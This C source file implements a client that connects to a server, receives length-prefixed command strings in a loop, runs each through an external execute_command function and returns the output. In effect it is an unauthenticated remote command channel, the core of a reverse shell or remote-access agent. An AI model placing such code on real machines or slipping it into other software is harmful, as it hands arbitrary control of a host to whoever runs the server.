#include "networking.h"
#include "command.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

// networking.h and networking.c
// The client needs to be able to receive commands from the server, execute them, and send back the response.

int setup_client_socket(const char *server_ip, int server_port) {
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) {
        perror("Socket creation failed");
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid server address");
        close(client_socket);
        return -1;
    }

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        close(client_socket);
        return -1;
    }

    return client_socket;
}

void handle_server_commands(int client_socket) {
    while (1) {
        // Receive the length of the command
        uint32_t cmd_len;
        if (recv(client_socket, &cmd_len, sizeof(cmd_len), 0) <= 0) {
            break;
        }
        cmd_len = ntohl(cmd_len); // Convert from network byte order to host byte order

        // Receive the command
        char *command = malloc(cmd_len + 1);
        if (!command) {
            perror("Memory allocation failed");
            break;
        }
        if (recv(client_socket, command, cmd_len, 0) <= 0) {
            free(command);
            break;
        }
        command[cmd_len] = '\0';

        // Execute the command and get the output
        char *output = execute_command(command);
        free(command);

        // Send the output back to the server
        if (output) {
            uint32_t output_len = strlen(output);
            uint32_t net_output_len = htonl(output_len); // Convert to network byte order
            send(client_socket, &net_output_len, sizeof(net_output_len), 0);
            send(client_socket, output, output_len, 0);
            free(output);
        }
    }
}
